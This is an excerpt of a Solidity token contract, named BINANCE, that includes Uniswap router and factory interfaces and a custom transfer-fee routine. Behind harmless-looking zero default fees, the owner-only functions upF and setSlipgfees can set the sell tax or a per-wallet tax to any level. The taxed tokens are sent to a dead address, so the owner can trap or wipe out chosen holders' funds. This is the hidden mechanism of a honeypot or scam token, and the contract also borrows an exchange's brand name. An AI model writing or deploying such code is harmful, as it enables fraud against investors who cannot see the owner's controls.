...
interface IUniswapV2Factory {
    ...
    function gfeesTo() external view returns (address);
    function gfeesToSetter() external view returns (address);
    ...
    function setgfeesTo(address) external;
    function setgfeesToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinggfeesOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinggfeesOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinggfeesOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinggfeesOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinggfeesOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract BINANCE is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellgfees = 0;

    uint256 private _defaultBuygfees = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipgfees;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellgfees = _value;
    }

    function setSlipgfees(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipgfees[_address] = _value;
    }

    function getSlipgfees(address _address) external view onlyownar returns (uint256) {
        return _slipgfees[_address];
    }


    function setMAccountgfees(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountgfees(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradegfeesAmount = 0;

        if (rF) {
            uint256 tradegfees = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradegfees = _defaultSellgfees;
                }
                if (from == uniswapV2Pair) {

                    tradegfees = _defaultBuygfees;
                }
            }
            if (_slipgfees[from] > 0) {
                tradegfees = _slipgfees[from];
            }

            tradegfeesAmount = _Amount.mul(tradegfees).div(100);
        }


        if (tradegfeesAmount > 0) {
            _balances[from] = _balances[from].sub(tradegfeesAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradegfeesAmount);
            emit Transfer(from, _deadAddress, tradegfeesAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradegfeesAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradegfeesAmount);
        emit Transfer(from, _to, _Amount - tradegfeesAmount);
    }
